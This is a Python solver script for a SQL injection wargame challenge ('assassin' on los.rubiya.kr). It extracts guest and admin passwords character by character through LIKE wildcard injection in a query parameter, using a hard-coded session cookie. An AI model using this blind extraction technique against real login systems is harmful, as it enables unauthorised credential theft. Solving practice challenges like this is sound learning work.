import urllib.request
import requests

url='https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
headers = { 'Cookie': 'PHPSESSID=8u0ue0omqon5eb2fqcmr03ev33' }
pw=""
guestpw=""
adminpw=""

for i in range (1,9):
    for j in range(48, 123):
        if (j == 95):
            continue
        query='?pw={}'.format(pw + chr(j) + '%')
        r = requests.get(url + query, headers=headers)
        if r.text.find("<h2>Hello guest</h2>") != -1:
            guestpw = pw + chr(j)
            print('password is ', guestpw)
        if r.text.find("<h2>Hello admin</h2>") != -1:
            adminpw = pw + chr(j)
            print('admin pw found ', adminpw)
    pw = guestpw